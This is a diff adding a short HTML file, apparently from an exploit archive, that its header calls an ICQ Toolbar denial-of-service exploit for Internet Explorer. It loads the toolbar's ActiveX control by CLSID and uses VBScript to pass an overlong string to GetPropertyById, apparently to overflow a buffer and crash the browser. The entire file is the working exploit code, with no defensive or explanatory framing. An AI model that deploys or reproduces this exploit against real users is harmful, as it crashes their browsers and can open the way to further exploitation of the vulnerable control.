@@ -1,0 +1,13 @@
+&lt;!--
+	Lame ICQToolbar IE DoS - Crash IE and change toolbar color :p
+--&gt;
+
+&lt;html&gt;
+&lt;object classid=&#039;clsid:855F3B16-6D32-4FE6-8A56-BBB695989046&#039; id=&#039;toolbar&#039; &gt;&lt;/object&gt;
+
+&lt;script language=&#039;vbscript&#039;&gt;
+bof=String(128, &quot;spdr&quot;)
+toolbar.GetPropertyById &quot;&quot; ,bof
+
+&lt;/script&gt;
+&lt;/html&gt;
